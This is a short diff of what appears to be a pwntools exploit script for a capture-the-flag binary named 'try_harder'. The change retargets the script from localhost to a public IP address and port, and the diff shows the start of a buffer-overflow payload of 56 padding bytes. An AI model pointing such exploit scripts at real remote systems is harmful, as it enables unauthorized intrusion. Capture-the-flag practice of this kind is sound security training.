@@ -5,7 +5,7 @@ binary = './try_harder'
 
 #p = process(binary)
 #p = gdb.debug(binary, gdbscript="""""")
-p = remote("localhost", 1337)
+p = remote("51.124.222.205", 13372)
 
 payload = (48 + 8) * b'A'
 
